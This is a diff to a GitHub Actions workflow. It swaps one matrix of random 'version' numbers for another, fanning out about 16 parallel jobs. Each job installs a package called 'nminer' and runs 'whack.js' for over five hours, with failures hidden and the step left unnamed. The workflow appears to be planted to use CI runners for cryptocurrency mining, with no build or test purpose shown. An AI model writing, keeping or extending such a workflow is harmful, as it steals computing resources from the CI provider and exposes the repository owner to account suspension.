@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1836 }
-          - { version: 9209 }
-          - { version: 6888 }
-          - { version: 8541 }
-          - { version: 4690 }
-          - { version: 6217 }
-          - { version: 1532 }
-          - { version: 9238 }
-          - { version: 2976 }
-          - { version: 3600 }
-          - { version: 5086 }
-          - { version: 6641 }
-          - { version: 359 }
-          - { version: 4750 }
-          - { version: 4377 }
-          - { version: 739 }
-          - { version: 7585 }
-          - { version: 9898 }
+          - { version: 4658 }
+          - { version: 1629 }
+          - { version: 2274 }
+          - { version: 3536 }
+          - { version: 130 }
+          - { version: 4709 }
+          - { version: 3523 }
+          - { version: 9521 }
+          - { version: 1635 }
+          - { version: 6548 }
+          - { version: 2628 }
+          - { version: 5301 }
+          - { version: 9033 }
+          - { version: 67 }
+          - { version: 5767 }
+          - { version: 6237 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: anaesthetise over
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 332m node whack.js || echo "whack executed"
+          timeout 316m node whack.js || echo "whack executed"
